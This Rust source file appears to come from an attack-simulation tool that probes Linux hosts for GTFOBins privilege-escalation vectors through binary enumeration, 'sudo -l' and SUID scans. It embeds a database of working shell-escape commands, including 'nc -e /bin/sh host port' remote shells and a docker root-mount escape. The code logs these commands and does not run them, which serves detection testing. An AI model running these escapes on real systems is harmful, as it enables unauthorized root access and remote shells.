// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

// SIGNALBENCH - GTFOBins Privilege Escalation Probe (T1548-GTFOBINS)
// Implements comprehensive GTFOBins detection and sudo permission analysis
//
// This technique probes for privilege escalation vectors by:
// - Detecting 100+ GTFOBins binaries on the system
// - Parsing sudo permissions with 'sudo -l'
// - Cross-referencing to identify exploitable combinations
// - Logging shell escape sequences without execution
//
// ACKNOWLEDGEMENTS:
// - GTFOBins project (https://gtfobins.github.io/) - Shell escape database
// - Traitor by liamg (https://github.com/liamg/traitor) - GTFOBins exploitation patterns
// - LinPEAS by Carlos Polop (https://github.com/peass-ng/PEASS-ng) - Enumeration techniques
//
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{
    AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter,
};
use async_trait::async_trait;
use log::{debug, info, warn};
use std::collections::HashMap;
use std::path::Path;
use tokio::process::Command;

// =============================================================================
// GTFOBins Database - Shell Escape Sequences
// =============================================================================

/// Represents a GTFOBins entry with shell escape information
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct GtfobinsEntry {
    pub binary: &'static str,
    pub escape_method: &'static str,
    pub shell_command: &'static str,
    pub requires_args: bool,
    pub category: &'static str,
}

/// Complete GTFOBins database derived from gtfobins.github.io and Traitor
/// Categories: shell (direct shell), sudo (sudo escape), suid (suid abuse), file_read, file_write
pub fn get_gtfobins_database() -> Vec<GtfobinsEntry> {
    vec![
        // Direct shell spawners
        GtfobinsEntry {
            binary: "ash",
            escape_method: "Direct shell",
            shell_command: "ash",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "bash",
            escape_method: "Direct shell",
            shell_command: "bash",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "busybox",
            escape_method: "Busybox shell",
            shell_command: "busybox sh",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "csh",
            escape_method: "Direct shell",
            shell_command: "csh",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "dash",
            escape_method: "Direct shell",
            shell_command: "dash",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "ksh",
            escape_method: "Direct shell",
            shell_command: "ksh",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "sh",
            escape_method: "Direct shell",
            shell_command: "sh",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "zsh",
            escape_method: "Direct shell",
            shell_command: "zsh",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "tmux",
            escape_method: "Terminal multiplexer",
            shell_command: "tmux",
            requires_args: false,
            category: "shell",
        },
        GtfobinsEntry {
            binary: "screen",
            escape_method: "Terminal multiplexer",
            shell_command: "screen",
            requires_args: false,
            category: "shell",
        },
        // Interactive escape via ! command
        GtfobinsEntry {
            binary: "less",
            escape_method: "Interactive !sh",
            shell_command: "less /dev/null -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "more",
            escape_method: "Interactive !sh",
            shell_command: "more /etc/profile -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "man",
            escape_method: "Interactive !sh",
            shell_command: "man man -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ftp",
            escape_method: "Interactive !sh",
            shell_command: "ftp -> !/bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "sftp",
            escape_method: "Interactive !sh",
            shell_command: "sftp user@host -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "psql",
            escape_method: "Interactive \\!",
            shell_command: "psql -> \\! /bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "mysql",
            escape_method: "System command",
            shell_command: "mysql -e '\\! /bin/sh'",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "sqlite3",
            escape_method: "Shell command",
            shell_command: "sqlite3 /dev/null '.shell /bin/sh'",
            requires_args: true,
            category: "sudo",
        },
        // Vim/editor family
        GtfobinsEntry {
            binary: "vi",
            escape_method: "Editor escape",
            shell_command: "vi -> :set shell=/bin/sh -> :shell",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "vim",
            escape_method: "Editor escape",
            shell_command: "vim -> :set shell=/bin/sh -> :shell",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "vimdiff",
            escape_method: "Editor escape",
            shell_command: "vimdiff -> :set shell=/bin/sh -> :shell",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "rvim",
            escape_method: "Python escape",
            shell_command: "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "rview",
            escape_method: "Python escape",
            shell_command: "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nano",
            escape_method: "Ctrl+R Ctrl+X",
            shell_command: "nano -> Ctrl+R -> Ctrl+X -> sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "pico",
            escape_method: "Ctrl+R Ctrl+X",
            shell_command: "pico -> Ctrl+R -> Ctrl+X -> sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ed",
            escape_method: "Interactive !sh",
            shell_command: "ed -> !/bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ex",
            escape_method: "Interactive !sh",
            shell_command: "ex -> !/bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "emacs",
            escape_method: "Shell buffer",
            shell_command: "emacs -Q -nw --eval '(term \"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        // Scripting languages
        GtfobinsEntry {
            binary: "python",
            escape_method: "OS system",
            shell_command: "python -c 'import os; os.system(\"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "python2",
            escape_method: "OS system",
            shell_command: "python2 -c 'import os; os.system(\"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "python3",
            escape_method: "OS system",
            shell_command: "python3 -c 'import os; os.system(\"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "perl",
            escape_method: "Exec",
            shell_command: "perl -e 'exec \"/bin/sh\";'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ruby",
            escape_method: "Exec",
            shell_command: "ruby -e 'exec \"/bin/sh\"'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "irb",
            escape_method: "Exec",
            shell_command: "irb -> exec '/bin/bash'",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "lua",
            escape_method: "OS execute",
            shell_command: "lua -e 'os.execute(\"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "php",
            escape_method: "System",
            shell_command: "php -r 'system(\"/bin/sh\");'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "node",
            escape_method: "Child process",
            shell_command:
                "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "tclsh",
            escape_method: "Exec",
            shell_command: "tclsh -> exec /bin/sh <@stdin >@stdout 2>@stderr",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "wish",
            escape_method: "Exec",
            shell_command: "wish -> exec /bin/sh <@stdin >@stdout 2>@stderr",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "expect",
            escape_method: "Spawn interact",
            shell_command: "expect -c 'spawn /bin/sh; interact'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ghci",
            escape_method: "System call",
            shell_command: "ghci -> System.Process.callCommand \"/bin/sh\"",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ghc",
            escape_method: "System call",
            shell_command: "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
            requires_args: true,
            category: "sudo",
        },
        // AWK family
        GtfobinsEntry {
            binary: "awk",
            escape_method: "System",
            shell_command: "awk 'BEGIN {system(\"/bin/sh\")}'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "gawk",
            escape_method: "System",
            shell_command: "gawk 'BEGIN {system(\"/bin/sh\")}'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "mawk",
            escape_method: "System",
            shell_command: "mawk 'BEGIN {system(\"/bin/sh\")}'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nawk",
            escape_method: "System",
            shell_command: "nawk 'BEGIN {system(\"/bin/sh\")}'",
            requires_args: true,
            category: "sudo",
        },
        // Find and exec
        GtfobinsEntry {
            binary: "find",
            escape_method: "Exec",
            shell_command: "find . -exec /bin/sh \\; -quit",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "xargs",
            escape_method: "Shell spawn",
            shell_command: "xargs -a /dev/null sh",
            requires_args: true,
            category: "sudo",
        },
        // Environment wrappers
        GtfobinsEntry {
            binary: "env",
            escape_method: "Shell spawn",
            shell_command: "env /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nice",
            escape_method: "Shell spawn",
            shell_command: "nice /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nohup",
            escape_method: "Shell spawn",
            shell_command: "nohup /bin/sh -c 'sh <$(tty) >$(tty) 2>$(tty)'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "time",
            escape_method: "Shell spawn",
            shell_command: "time /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "timeout",
            escape_method: "Shell spawn",
            shell_command: "timeout 7d /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "stdbuf",
            escape_method: "Shell spawn",
            shell_command: "stdbuf -i0 /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ionice",
            escape_method: "Shell spawn",
            shell_command: "ionice /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "taskset",
            escape_method: "Shell spawn",
            shell_command: "taskset 1 /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "setarch",
            escape_method: "Shell spawn",
            shell_command: "setarch x86_64 /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "unshare",
            escape_method: "Shell spawn",
            shell_command: "unshare /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nsenter",
            escape_method: "Shell spawn",
            shell_command: "nsenter /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "chroot",
            escape_method: "Shell spawn",
            shell_command: "chroot / /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "flock",
            escape_method: "Shell spawn",
            shell_command: "flock -u / /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "logsave",
            escape_method: "Shell spawn",
            shell_command: "logsave /dev/null /bin/sh -i",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "script",
            escape_method: "Shell spawn",
            shell_command: "script -q /dev/null",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "start-stop-daemon",
            escape_method: "Shell spawn",
            shell_command: "start-stop-daemon -n $RANDOM -S -x /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "run-parts",
            escape_method: "Regex match",
            shell_command: "run-parts --new-session --regex '^sh$' /bin",
            requires_args: true,
            category: "sudo",
        },
        // Package managers
        GtfobinsEntry {
            binary: "apt",
            escape_method: "Changelog escape",
            shell_command: "apt changelog apt -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "apt-get",
            escape_method: "Changelog escape",
            shell_command: "apt-get changelog apt -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "dpkg",
            escape_method: "Interactive !sh",
            shell_command: "dpkg -l -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "rpm",
            escape_method: "Lua exec",
            shell_command: "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "yum",
            escape_method: "Plugin shell",
            shell_command: "yum -q shell -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "cpan",
            escape_method: "Interactive !sh",
            shell_command: "cpan -> ! exec '/bin/sh'",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "gem",
            escape_method: "Open shell",
            shell_command: "gem open -e '/bin/sh -c /bin/sh' rdoc",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "pip",
            escape_method: "System command",
            shell_command: "pip install . --global-option='--install-scripts=/tmp' --prefix=/tmp",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "bundler",
            escape_method: "Help escape",
            shell_command: "bundler help -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        // Compilers and dev tools
        GtfobinsEntry {
            binary: "gcc",
            escape_method: "Wrapper",
            shell_command: "gcc -wrapper /bin/sh,-s .",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "make",
            escape_method: "Eval shell",
            shell_command: "make -s --eval=$'x:\\n\\t-'/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "gdb",
            escape_method: "Shell command",
            shell_command: "gdb -nx -ex '!sh' -ex quit",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "strace",
            escape_method: "Shell spawn",
            shell_command: "strace -o /dev/null /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ltrace",
            escape_method: "Shell spawn",
            shell_command: "ltrace -b -L /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "valgrind",
            escape_method: "Shell spawn",
            shell_command: "valgrind /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "pdb",
            escape_method: "OS system",
            shell_command: "pdb script.py -> import os; os.system('/bin/sh')",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "byebug",
            escape_method: "System",
            shell_command: "byebug script.rb -> system('/bin/sh')",
            requires_args: true,
            category: "sudo",
        },
        // Network tools
        GtfobinsEntry {
            binary: "nmap",
            escape_method: "NSE script",
            shell_command: "nmap --script=script.nse (os.execute('/bin/sh'))",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ssh",
            escape_method: "ProxyCommand",
            shell_command: "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "scp",
            escape_method: "Script",
            shell_command: "scp -S script.sh x y (script runs sh)",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "rsync",
            escape_method: "Script",
            shell_command: "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "socat",
            escape_method: "Exec",
            shell_command: "socat stdin exec:/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "nc",
            escape_method: "Exec",
            shell_command: "nc -e /bin/sh host port",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "ncat",
            escape_method: "Exec",
            shell_command: "ncat -e /bin/sh host port",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "hping3",
            escape_method: "Interactive",
            shell_command: "hping3 -> /bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "iftop",
            escape_method: "Interactive !sh",
            shell_command: "iftop -> !/bin/sh",
            requires_args: false,
            category: "sudo",
        },
        // Archive tools
        GtfobinsEntry {
            binary: "tar",
            escape_method: "Checkpoint",
            shell_command:
                "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "zip",
            escape_method: "Test script",
            shell_command: "zip file.zip /etc/hosts -T -TT 'sh #'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "unzip",
            escape_method: "Overwrite",
            shell_command: "unzip -K archive.zip (extracts suid binary)",
            requires_args: true,
            category: "suid",
        },
        GtfobinsEntry {
            binary: "cpio",
            escape_method: "Passthrough",
            shell_command: "cpio -o (can overwrite files with suid)",
            requires_args: true,
            category: "suid",
        },
        // Text processing
        GtfobinsEntry {
            binary: "sed",
            escape_method: "Exec",
            shell_command: "sed -n '1e exec sh 1>&0' /etc/hosts",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "split",
            escape_method: "Filter",
            shell_command: "split --filter=/bin/sh /dev/stdin",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "pic",
            escape_method: "Shell",
            shell_command: "pic -U -> .PS -> sh X sh X",
            requires_args: true,
            category: "sudo",
        },
        // Debuggers
        GtfobinsEntry {
            binary: "crash",
            escape_method: "Interactive !sh",
            shell_command: "crash -h -> !sh",
            requires_args: true,
            category: "sudo",
        },
        // System tools
        GtfobinsEntry {
            binary: "systemctl",
            escape_method: "Pager escape",
            shell_command: "systemctl -> !/bin/sh (via PAGER)",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "journalctl",
            escape_method: "Interactive !sh",
            shell_command: "journalctl -> !/bin/sh",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "dmesg",
            escape_method: "Interactive !sh",
            shell_command: "dmesg -H -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "service",
            escape_method: "Path traversal",
            shell_command: "service ../../../../../bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "busctl",
            escape_method: "Interactive !sh",
            shell_command: "busctl --show-machine -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        // Git
        GtfobinsEntry {
            binary: "git",
            escape_method: "Pager",
            shell_command: "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
            requires_args: true,
            category: "sudo",
        },
        // Docker/container
        GtfobinsEntry {
            binary: "docker",
            escape_method: "Container mount",
            shell_command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "kubectl",
            escape_method: "Exec",
            shell_command: "kubectl exec -it pod -- /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        // Misc
        GtfobinsEntry {
            binary: "rlwrap",
            escape_method: "Shell wrap",
            shell_command: "rlwrap /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "watch",
            escape_method: "Shell",
            shell_command: "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "cpulimit",
            escape_method: "Fork",
            shell_command: "cpulimit -l 100 -f /bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "gimp",
            escape_method: "Python-fu",
            shell_command:
                "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "slsh",
            escape_method: "System",
            shell_command: "slsh -e 'system(\"/bin/sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "jrunscript",
            escape_method: "Exec",
            shell_command: "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh\")'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "rake",
            escape_method: "Backtick",
            shell_command: "rake -p '`/bin/sh 1>&0`'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "pry",
            escape_method: "System",
            shell_command: "pry -> system('/bin/sh')",
            requires_args: false,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "puppet",
            escape_method: "Apply exec",
            shell_command: "puppet apply -e 'exec { \"/bin/sh\": }'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "mail",
            escape_method: "Exec",
            shell_command: "mail --exec='!/bin/sh'",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "run-mailcap",
            escape_method: "Interactive !sh",
            shell_command: "run-mailcap --action=view /etc/hosts -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "check_by_ssh",
            escape_method: "ProxyCommand",
            shell_command: "check_by_ssh -o 'ProxyCommand /bin/sh -i' -H localhost -C xx",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "cowsay",
            escape_method: "Perl escape",
            shell_command: "cowsay -f script.cow (exec '/bin/sh')",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "cowthink",
            escape_method: "Perl escape",
            shell_command: "cowthink -f script.cow (exec '/bin/sh')",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "gtester",
            escape_method: "Script",
            shell_command: "gtester -q script.sh (#!/bin/sh exec sh)",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "eb",
            escape_method: "Interactive !sh",
            shell_command: "eb logs -> !/bin/sh",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "capsh",
            escape_method: "Shell",
            shell_command: "capsh --",
            requires_args: true,
            category: "sudo",
        },
        GtfobinsEntry {
            binary: "check_cups",
            escape_method: "COBOL escape",
            shell_command: "check_cups with COBOL system call",
            requires_args: true,
            category: "sudo",
        },
        // Capability tools (for SUID exploitation)
        GtfobinsEntry {
            binary: "setcap",
            escape_method: "Set caps",
            shell_command: "setcap cap_setuid+ep /path/to/binary",
            requires_args: true,
            category: "suid",
        },
        GtfobinsEntry {
            binary: "getcap",
            escape_method: "Enumerate",
            shell_command: "getcap -r / 2>/dev/null",
            requires_args: true,
            category: "suid",
        },
    ]
}

/// Represents a detected exploitable binary
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct ExploitableBinary {
    pub binary_path: String,
    pub binary_name: String,
    pub sudo_allowed: bool,
    pub suid_set: bool,
    pub escape_method: String,
    pub shell_command: String,
    pub category: String,
}

// =============================================================================
// T1548-GTFOBINS: GTFOBins Privilege Escalation Probe
// =============================================================================

pub struct GtfobinsProbe {}

#[async_trait]
impl AttackTechnique for GtfobinsProbe {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548-GTFOBINS".to_string(),
            name: "GTFOBins Privilege Escalation Probe".to_string(),
            description: "Comprehensive GTFOBins privilege escalation probe that detects 100+ \
                potentially exploitable binaries on the system. This technique enumerates installed \
                GTFOBins binaries, parses sudo permissions with 'sudo -l', identifies SUID binaries, \
                and cross-references against the GTFOBins database to identify privilege escalation \
                vectors. Generates enumeration telemetry without executing actual shell escapes. \
                Based on the GTFOBins project, Traitor by liamg, and LinPEAS enumeration patterns.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "check_sudo".to_string(),
                    description: "Parse sudo permissions with 'sudo -l'".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "check_suid".to_string(),
                    description: "Scan for SUID binaries in common paths".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "generate_telemetry".to_string(),
                    description: "Execute safe version commands to generate telemetry".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for rapid 'which' command execution, 'sudo -l' enumeration, \
                SUID binary discovery (find -perm), and sequential probing of known GTFOBins. \
                EDR systems will detect: privilege escalation reconnaissance, sudo permission \
                enumeration, SUID/capability scanning, and potential shell escape attempts.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let check_sudo = config
                .parameters
                .get("check_sudo")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            let check_suid = config
                .parameters
                .get("check_suid")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            let generate_telemetry = config
                .parameters
                .get("generate_telemetry")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            debug!("[T1548-GTFOBINS] Starting GTFOBins privilege escalation probe");
            debug!(
                "[T1548-GTFOBINS] Parameters: check_sudo={}, check_suid={}, generate_telemetry={}",
                check_sudo, check_suid, generate_telemetry
            );

            if dry_run {
                info!("[DRY RUN] Would perform GTFOBins privilege escalation probe:");
                info!("[DRY RUN] - Enumerate 100+ GTFOBins binaries on system");
                if check_sudo {
                    info!("[DRY RUN] - Parse sudo permissions with 'sudo -l'");
                }
                if check_suid {
                    info!("[DRY RUN] - Scan for SUID binaries in /usr/bin, /usr/sbin, /bin, /sbin");
                }
                info!("[DRY RUN] - Cross-reference findings against GTFOBins database");
                info!("[DRY RUN] - Report exploitable binaries with shell escape sequences");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform GTFOBins privilege escalation probe"
                        .to_string(),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            info!("[T1548-GTFOBINS] Starting comprehensive GTFOBins enumeration");

            let gtfobins_db = get_gtfobins_database();
            debug!(
                "[T1548-GTFOBINS] Loaded {} GTFOBins entries from database",
                gtfobins_db.len()
            );

            let mut exploitable: Vec<ExploitableBinary> = Vec::new();
            let mut binaries_found = 0;
            let mut sudo_entries: HashMap<String, bool> = HashMap::new();
            let mut suid_binaries: Vec<String> = Vec::new();

            // Step 1: Enumerate which GTFOBins binaries exist on the system
            info!("[T1548-GTFOBINS] Step 1: Enumerating GTFOBins binaries on system");

            let common_paths = ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"];
            let mut binary_paths: HashMap<String, String> = HashMap::new();

            for entry in &gtfobins_db {
                for base_path in &common_paths {
                    let full_path = format!("{}/{}", base_path, entry.binary);
                    if Path::new(&full_path).exists() {
                        debug!("[T1548-GTFOBINS] Found: {} at {}", entry.binary, full_path);
                        binary_paths.insert(entry.binary.to_string(), full_path.clone());
                        binaries_found += 1;
                        break;
                    }
                }
            }

            info!(
                "[T1548-GTFOBINS] Found {}/{} GTFOBins binaries on system",
                binaries_found,
                gtfobins_db.len()
            );

            // Step 2: Parse sudo permissions
            if check_sudo {
                info!("[T1548-GTFOBINS] Step 2: Parsing sudo permissions with 'sudo -l'");
                debug!("[T1548-GTFOBINS] Executing: sudo -l -n 2>/dev/null");

                match Command::new("sudo").args(["-l", "-n"]).output().await {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        debug!("[T1548-GTFOBINS] sudo -l output: {} bytes", stdout.len());

                        // Parse (ALL) or (root) NOPASSWD entries
                        for line in stdout.lines() {
                            let line_lower = line.to_lowercase();
                            debug!("[T1548-GTFOBINS] Parsing sudo line: {}", line);

                            // Check for NOPASSWD or ALL permissions
                            if line_lower.contains("nopasswd")
                                || line_lower.contains("(all)")
                                || line_lower.contains("(root)")
                            {
                                // Extract binary paths from the line
                                for entry in &gtfobins_db {
                                    if line.contains(entry.binary)
                                        || line.contains(&format!("/{}", entry.binary))
                                    {
                                        debug!("[T1548-GTFOBINS] Sudo allows: {}", entry.binary);
                                        sudo_entries.insert(entry.binary.to_string(), true);
                                    }
                                }

                                // Check for ALL command permission
                                if line.contains("ALL") && !line.contains("!") {
                                    debug!("[T1548-GTFOBINS] User has ALL sudo permissions");
                                    for entry in &gtfobins_db {
                                        if binary_paths.contains_key(entry.binary) {
                                            sudo_entries.insert(entry.binary.to_string(), true);
                                        }
                                    }
                                }
                            }
                        }

                        info!(
                            "[T1548-GTFOBINS] Found {} sudo-allowed GTFOBins entries",
                            sudo_entries.len()
                        );
                    }
                    Err(e) => {
                        debug!(
                            "[T1548-GTFOBINS] sudo -l failed (expected if no sudo access): {}",
                            e
                        );
                        info!("[T1548-GTFOBINS] Could not query sudo permissions (may require password)");
                    }
                }
            }

            // Step 3: Scan for SUID binaries
            if check_suid {
                info!("[T1548-GTFOBINS] Step 3: Scanning for SUID binaries");

                for base_path in &common_paths {
                    debug!("[T1548-GTFOBINS] Scanning for SUID in: {}", base_path);

                    match Command::new("find")
                        .args([base_path, "-perm", "-4000", "-type", "f"])
                        .output()
                        .await
                    {
                        Ok(output) => {
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            for line in stdout.lines() {
                                let binary_name = Path::new(line)
                                    .file_name()
                                    .map(|n| n.to_string_lossy().to_string())
                                    .unwrap_or_default();

